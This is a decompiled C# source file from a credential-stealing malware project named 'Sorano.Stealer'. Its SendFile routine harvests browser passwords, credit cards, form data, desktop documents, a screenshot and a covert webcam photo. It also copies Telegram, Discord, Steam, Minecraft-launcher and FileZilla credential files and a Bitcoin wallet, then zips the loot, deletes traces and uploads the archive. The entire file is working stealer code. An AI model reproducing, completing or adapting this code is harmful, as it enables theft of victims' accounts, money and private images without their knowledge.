using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using Sorano.BTC;
using Sorano.Cookies;

namespace Sorano.Stealer
{
	// Token: 0x02000012 RID: 18
	internal static class Passwords
	{
		// Token: 0x0600002F RID: 47 RVA: 0x00004348 File Offset: 0x00002548
		public static void SendFile()
		{
			string randomString = Helper.GetRandomString();
			string text = Path.GetTempPath() + randomString;
			Directory.CreateDirectory(text);
			using (StreamWriter streamWriter = new StreamWriter(text + "\\pass.log"))
			{
				streamWriter.WriteLine(string.Format("Date: {0}\r\n", DateTime.Now) + string.Format("Windows Username: {0}\r\n", Environment.UserName) + string.Format("HWID: {0}\r\n", RawSettings.HWID) + string.Format("System: {0}\r\n", Passwords.GetWindowsVersion()));
				try
				{
					foreach (PassData value in Chromium.Initialise())
					{
						streamWriter.WriteLine(value);
					}
				}
				catch
				{
				}
			}
			try
			{
				Passwords.DesktopCopy(text);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
			try
			{
			}
			catch
			{
			}
			try
			{
				Passwords.get_screenshot(text + "\\desktop.jpg");
			}
			catch (Exception ex2)
			{
				Console.WriteLine(ex2.ToString());
			}
			try
			{
				Passwords.grab_minecraft(text);
			}
			catch (Exception)
			{
			}
			try
			{
				Passwords.Returgen.get_webcam(text + "\\CamPicture.png");
			}
			catch (Exception ex3)
			{
				Console.WriteLine(ex3.ToString());
			}
			try
			{
				Passwords.grab_telegram(text);
			}
			catch (Exception)
			{
			}
			try
			{
				Passwords.grab_discord(text);
			}
			catch (Exception)
			{
			}
			try
			{
				Chromium.ChromiumInitialise(text + "\\");
			}
			catch (Exception ex4)
			{
				Console.WriteLine(ex4.ToString());
			}
			try
			{
				CC.grab_cards(text + "\\");
			}
			catch (Exception ex5)
			{
				Console.WriteLine(ex5.ToString());
			}
			try
			{
				GrabForms.grab_forms(text + "\\");
			}
			catch (Exception ex6)
			{
				Console.WriteLine(ex6.ToString());
			}
			try
			{
				FilezillaFTP.FileZilla.Initialise(text + "\\");
			}
			catch (Exception ex7)
			{
				Console.WriteLine(ex7.ToString());
			}
			try
			{
				string bitcoin = Crypto.get_bitcoin();
				bool flag = bitcoin != "" && File.Exists(bitcoin);
				if (flag)
				{
					File.Copy(bitcoin, text + "\\wallet.dat");
				}
			}
			catch (Exception ex8)
			{
				Console.WriteLine(ex8.ToString());
			}
			try
			{
			}
			catch (Exception ex9)
			{
				Console.WriteLine(ex9.ToString());
			}
			try
			{
				Passwords.Zip(text, Path.GetTempPath() + "\\" + randomString + ".zip");
			}
			catch (Exception ex10)
			{
				Console.WriteLine(ex10.ToString());
			}
			try
			{
				Passwords.RemoveTempFiles(text);
			}
			catch (Exception ex11)
			{
				Console.WriteLine(ex11.ToString());
			}
			try
			{
				Network.UploadFile(Path.GetTempPath() + "\\" + randomString + ".zip");
			}
			catch (Exception ex12)
			{
				Console.WriteLine(ex12.ToString());
			}
		}

		// Token: 0x06000030 RID: 48 RVA: 0x0000212E File Offset: 0x0000032E
		private static void Zip(string path, string s)
		{
			ZipFile.CreateFromDirectory(path, s, CompressionLevel.Fastest, false, Encoding.UTF8);
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00004748 File Offset: 0x00002948
		private static void grab_telegram(string string_0)
		{
			string environmentVariable = Environment.GetEnvironmentVariable("AppData");
			bool flag = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\Telegram.exe");
			if (flag)
			{
				Directory.CreateDirectory(string_0 + "\\Telegram");
				try
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C1", string_0 + "\\Telegram\\BA06DDED727EF6FD1", true);
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C0", string_0 + "\\Telegram\\D80AAA9EA28983B50", true);
				}
				catch
				{
				}
				try
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata\\D877F783D5D3EF8C\\map1", string_0 + "\\Telegram\\map1", true);
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata\\D877F783D5D3EF8C\\map0", string_0 + "\\Telegram\\map0", true);
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000032 RID: 50 RVA: 0x0000484C File Offset: 0x00002A4C
		private static void grab_discord(string string_0)
		{
			Directory.CreateDirectory(string_0 + "\\Discord");
			try
			{
				bool flag = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\\\discord\\Local Storage\\https_discordapp.com_0.localstorage");
				if (flag)
				{
					Directory.CreateDirectory(string_0 + "\\Discord");
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\https_discordapp.com_0.localstorage", string_0 + "\\Discord\\https_discordapp.com_0.localstorage", true);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000033 RID: 51 RVA: 0x000048D4 File Offset: 0x00002AD4
		private static void grab_minecraft(string string_0)
		{
			string environmentVariable = Environment.GetEnvironmentVariable("AppData");
			Environment.GetEnvironmentVariable("LocalAppData");
			string environmentVariable2 = Environment.GetEnvironmentVariable("userprofile");
			Environment.GetEnvironmentVariable("username");
			try
			{
				bool flag = File.Exists(environmentVariable + "\\.minecraftonly\\userdata");
				if (flag)
				{
					Directory.CreateDirectory(string_0 + "\\Applications\\MinecraftOnly\\");
					File.Copy(environmentVariable + "\\.minecraftonly\\userdata", string_0 + "\\Applications\\MinecraftOnly\\userdata", true);
				}
			}
			catch (Exception)
			{
			}
			try
			{
				bool flag2 = File.Exists(environmentVariable + "\\.vimeworld\\config");
				if (flag2)
				{
					Directory.CreateDirectory(string_0 + "\\Applications\\VimeWorld\\");
					File.Copy(environmentVariable + "\\.vimeworld\\config", string_0 + "\\Applications\\VimeWorld\\config", true);
				}
			}
			catch (Exception)
			{
			}
			try
			{
				bool flag3 = File.Exists(environmentVariable2 + "\\McSkill\\settings.bin");
				if (flag3)
				{
					Directory.CreateDirectory(string_0 + "\\Applications\\McSkill\\");
					File.Copy(environmentVariable2 + "\\McSkill\\settings.bin", string_0 + "\\Applications\\McSkill\\settings.bin", true);
				}
			}
			catch (Exception)
			{
			}
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Valve").OpenSubKey("Steam");
				string text = (string)registryKey.GetValue("SteamPath");
				bool flag4 = File.Exists(text + "\\Steam.exe");
				if (flag4)
				{
					Directory.CreateDirectory(string_0 + "\\Applications\\Steam\\");
					FileInfo[] files = new DirectoryInfo(text).GetFiles();
					for (int i = 0; i < files.Length; i++)
					{
						Directory.CreateDirectory(string_0 + "\\Applications\\Steam\\config");
					}
					foreach (FileInfo fileInfo in new DirectoryInfo(text).GetFiles())
					{
						bool flag5 = fileInfo.Name.Contains("ssfn");
						if (flag5)
						{
							fileInfo.CopyTo(string_0 + "\\Applications\\Steam\\" + fileInfo.Name);
						}
					}
					File.Copy(text + "\\config\\config.vdf", string_0 + "\\Applications\\Steam\\config\\config.vdf", true);
					File.Copy(text + "\\config\\loginusers.vdf", string_0 + "\\Applications\\Steam\\config\\loginusers.vdf", true);
				}
			}
			catch (Exception)
			{
			}
			try
			{
				bool flag6 = File.Exists(environmentVariable + "\\.LavaServer\\Settings.reg");
				if (flag6)
				{
					Directory.CreateDirectory(string_0 + "\\Applications\\LavaCraft\\");
					File.Copy(environmentVariable + "\\.LavaServer\\Settings.reg", string_0 + "\\Applications\\LavaCraft\\Settings.reg", true);
				}
			}
			catch (Exception)
			{
			}
			try
			{
				bool flag7 = File.Exists(environmentVariable + "\\.minecraft\\launcher_profiles.json");
				if (flag7)
				{
					Directory.CreateDirectory(string_0 + "\\Applications\\MinecraftLauncher\\");
					File.Copy(environmentVariable + "\\.minecraft\\launcher_profiles.json", string_0 + "\\Applications\\MinecraftLauncher\\launcher_profiles.json", true);
				}
			}
			catch (Exception)
			{
			}
			try
			{
				bool flag8 = File.Exists(environmentVariable + "\\.redserver\\authdata");
				if (flag8)
				{
					Directory.CreateDirectory(string_0 + "\\Applications\\RedServer\\");
					File.Copy(environmentVariable + "\\.redserver\\authdata", string_0 + "\\Applications\\RedServer\\authdata", true);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00004CD8 File Offset: 0x00002ED8
		public static string GetWindowsVersion()
		{
			string result;
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM CIM_OperatingSystem");
				string text = string.Empty;
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					text = managementBaseObject["Caption"].ToString();
				}
				bool flag = text.Contains("8");
				if (flag)
				{
					result = "Windows 8";
				}
				else
				{
					bool flag2 = text.Contains("8.1");
					if (flag2)
					{
						result = "Windows 8.1";
					}
					else
					{
						bool flag3 = text.Contains("10");
						if (flag3)
						{
							result = "Windows 10";
						}
						else
						{
							bool flag4 = text.Contains("XP");
							if (flag4)
							{
								result = "Windows XP";
							}
							else
							{
								bool flag5 = text.Contains("7");
								if (flag5)
								{
									result = "Windows 7";
								}
								else
								{
									result = (text.Contains("Server") ? "Windows Server" : "Unknown");
								}
							}
						}
					}
				}
			}
			catch
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00004E00 File Offset: 0x00003000
		private static void DesktopCopy(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles())
				{
					bool flag = !(fileInfo.Extension != ".txt") || !(fileInfo.Extension != ".doc") || !(fileInfo.Extension != ".docx") || !(fileInfo.Extension != ".log");
					if (flag)
					{
						Directory.CreateDirectory(directorypath + "\\Files\\");
						fileInfo.CopyTo(directorypath + "\\Files\\" + fileInfo.Name);
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}

		// Token: 0x06000036 RID: 54 RVA: 0x00004EE0 File Offset: 0x000030E0
		private static void RemoveTempFiles(string directorypath)
		{
			try
			{
				foreach (DirectoryInfo directoryInfo in new DirectoryInfo(directorypath).GetDirectories())
				{
					foreach (FileInfo fileSystemInfo in directoryInfo.GetFiles())
					{
						fileSystemInfo.Delete();
					}
					directoryInfo.Delete();
				}
				foreach (FileInfo fileSystemInfo2 in new DirectoryInfo(directorypath).GetFiles())
				{
					fileSystemInfo2.Delete();
				}
				Directory.Delete(directorypath);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00004F9C File Offset: 0x0000319C
		private static void get_screenshot(string string_0)
		{
			try
			{
				int width = Screen.PrimaryScreen.Bounds.Width;
				int height = Screen.PrimaryScreen.Bounds.Height;
				Bitmap bitmap = new Bitmap(width, height);
				Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
				bitmap.Save(string_0, ImageFormat.Jpeg);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}

		// Token: 0x02000013 RID: 19
		internal class Returgen
		{
			// Token: 0x06000038 RID: 56 RVA: 0x00005024 File Offset: 0x00003224
			[CompilerGenerated]
			internal static void get_webcam(string string_0)
			{
				IntPtr intPtr = Marshal.StringToHGlobalAnsi(string_0);
				IntPtr intptr_ = Passwords.Returgen.capCreateCaptureWindowA("VFW Capture", -1073741824, 0, 0, 640, 480, 0, 0);
				Passwords.Returgen.SendMessage(intptr_, 1034u, 0, 0);
				Passwords.Returgen.SendMessage(intptr_, 1049u, 0, intPtr.ToInt32());
				Passwords.Returgen.SendMessage(intptr_, 1035u, 0, 0);
				Passwords.Returgen.SendMessage(intptr_, 16u, 0, 0);
			}

			// Token: 0x06000039 RID: 57
			[DllImport("avicap32.dll")]
			public static extern IntPtr capCreateCaptureWindowA(string string_0, int int_0, int int_1, int int_2, int int_3, int int_4, int int_5, int int_6);

			// Token: 0x0600003A RID: 58
			[DllImport("user32")]
			public static extern int SendMessage(IntPtr intptr_0, uint uint_0, int int_0, int int_1);
		}
	}
}
